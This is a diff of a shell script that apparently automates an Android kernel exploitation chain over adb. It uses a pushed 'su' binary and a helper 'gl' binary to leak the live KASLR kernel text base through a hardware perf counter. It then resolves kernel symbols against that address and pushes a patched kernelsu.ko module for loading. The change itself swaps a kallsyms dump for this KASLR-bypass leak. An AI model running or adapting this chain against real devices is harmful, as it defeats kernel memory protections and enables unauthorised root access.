@@ -17,18 +17,21 @@ if ! adb shell "/data/local/tmp/su -c id" 2>/dev/null | grep -q "uid=0"; then
     bash "${SCRIPT_DIR}/deploy_sog05.sh"
 fi
 
-echo "[*] Dumping live kernel symbol table from /proc/kallsyms..."
-adb shell "/data/local/tmp/su -c 'cat /proc/kallsyms'" > "${WORKSPACE_DIR}/live_kallsyms.txt"
+echo "[*] Leaking current boot KASLR text base via hardware perf counter..."
+LEAK_OUTPUT=$(adb shell "DIAG_LEAK_ONLY=1 /data/local/tmp/gl" 2>/dev/null || true)
+LIVE_TEXT_BASE=$(echo "$LEAK_OUTPUT" | grep -o 'text_base=[0-9a-fA-F]*' | cut -d= -f2 || true)
 
-if ! grep -q -v "0000000000000000" "${WORKSPACE_DIR}/live_kallsyms.txt" 2>/dev/null; then
-    echo "[-] Warning: live_kallsyms.txt seems masked or empty! Checking..."
+if [ -n "$LIVE_TEXT_BASE" ]; then
+    echo "[+] Live kernel text_base detected: 0x${LIVE_TEXT_BASE}"
+    python3 "${WORKSPACE_DIR}/scripts/resolve_symbols.py" \
+        "${WORKSPACE_DIR}/kernelsu.ko" \
+        "${WORKSPACE_DIR}/kallsyms.txt" \
+        "${WORKSPACE_DIR}/Module.symvers" \
+        "0x${LIVE_TEXT_BASE}"
+else
+    echo "[-] Error: Failed to leak live KASLR text_base via DIAG_LEAK_ONLY!"
+    exit 1
 fi
-
-echo "[*] Dynamically resolving symbols for current boot KASLR slide..."
-python3 "${WORKSPACE_DIR}/scripts/resolve_symbols.py" \
-    "${WORKSPACE_DIR}/kernelsu.ko" \
-    "${WORKSPACE_DIR}/live_kallsyms.txt" \
-    "${WORKSPACE_DIR}/Module.symvers"
 
 echo "[*] Transferring dynamically adapted kernelsu.ko to /data/local/tmp/..."
 adb push "${WORKSPACE_DIR}/kernelsu.ko" /data/local/tmp/kernelsu.ko
